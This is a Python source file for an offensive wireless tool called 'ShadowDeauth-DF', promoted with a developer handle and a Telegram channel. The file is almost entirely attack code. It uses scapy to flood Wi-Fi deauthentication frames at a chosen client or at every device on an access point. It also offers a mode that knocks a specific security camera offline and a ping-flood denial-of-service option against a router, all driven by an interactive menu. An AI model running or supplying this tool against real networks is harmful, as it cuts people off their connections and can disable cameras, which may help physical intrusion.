import os
import platform
import subprocess
from scapy.all import *
from rich.console import Console
from rich.panel import Panel
import pyfiglet
import threading

console = Console()

def check_requirements():
    try:
        import scapy
        import rich
        import pyfiglet
    except ImportError:
        console.print("[bold yellow]Some required Python libraries are missing. Installing them now...[/bold yellow]")
        os.system("pip install scapy rich pyfiglet")

    if platform.system().lower() == "linux":
        if not os.geteuid() == 0:
            console.print("[bold red]You need to run this script as root![/bold red]")
            exit(1)
        if not is_monitor_mode_supported():
            console.print("[bold red]Your network interface does not support monitor mode![/bold red]")
            exit(1)
    elif platform.system().lower() == "windows":
        console.print("[bold yellow]Make sure you are running CMD/PowerShell as administrator![/bold yellow]")

def is_monitor_mode_supported():
    try:
        result = subprocess.check_output("iwconfig", shell=True).decode()
        return "Mode:Monitor" in result
    except subprocess.CalledProcessError:
        return False

def banner():
    console.print(pyfiglet.figlet_format("ShadowDeauth-DF"), style="bold green")
    console.print(
        Panel(
            "[bold cyan]Developer: @A_Y_TR[/bold cyan]\n"
            "[bold magenta]Channel: https://t.me/cybersecurityTemDF[/bold magenta]",
            style="bold yellow",
        )
    )

def deauth_attack(target_mac, ap_mac, iface, packet_count):
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    for _ in range(packet_count):
        sendp(packet, iface=iface, verbose=0, loop=1)

def dos_attack(target_ip, iface, duration):
    os.system(f"ping {target_ip} -t {duration} -i 0.001")

def router_attack(ap_mac, iface, packet_count):
    deauth_attack('ff:ff:ff:ff:ff:ff', ap_mac, iface, packet_count)

def camera_attack(target_mac, ap_mac, iface, packet_count):
    deauth_attack(target_mac, ap_mac, iface, packet_count)

def help_message():
    console.print("""
    [bold green]ShadowDeauth-DF Help[/bold green]
    1. [bold blue]Massive Deauth Attack[/bold blue]: Attack all devices connected to the specified AP.
    2. [bold blue]DOS Attack on Router[/bold blue]: Overload the router using ping flood.
    3. [bold blue]Attack on Specific Camera[/bold blue]: Disconnect a specific camera from the network.
    4. [bold blue]Exit[/bold blue]: Exit the tool.
    """)

def main():
    check_requirements()
    while True:
        banner()
        console.print("[bold blue]1.[/bold blue] Massive Deauth Attack")
        console.print("[bold blue]2.[/bold blue] DOS Attack on Router")
        console.print("[bold blue]3.[/bold blue] Attack on Specific Camera")
        console.print("[bold blue]4.[/bold blue] Exit")
        
        choice = input("\n[bold yellow]Choose an option: [/bold yellow]")
        
        if choice == "1":
            target_mac = input("Enter target MAC ('ff:ff:ff:ff:ff:ff' for all devices): ")
            ap_mac = input("Enter AP MAC (Router): ")
            iface = input("Enter network interface: ")
            packet_count = int(input("Number of packets to send: "))
            deauth_attack(target_mac, ap_mac, iface, packet_count)
        
        elif choice == "2":
            target_ip = input("Enter target IP (Router IP): ")
            iface = input("Enter network interface: ")
            duration = int(input("Duration of DOS attack (seconds): "))
            dos_attack(target_ip, iface, duration)
        
        elif choice == "3":
            target_mac = input("Enter target camera MAC: ")
            ap_mac = input("Enter AP MAC (Router): ")
            iface = input("Enter network interface: ")
            packet_count = int(input("Number of packets to send: "))
            camera_attack(target_mac, ap_mac, iface, packet_count)
        
        elif choice == "4":
            console.print("[bold green]Exiting...[/bold green]")
            break
        
        else:
            console.print("[bold red]Invalid choice. Try again![/bold red]")

if __name__ == "__main__":
    main()
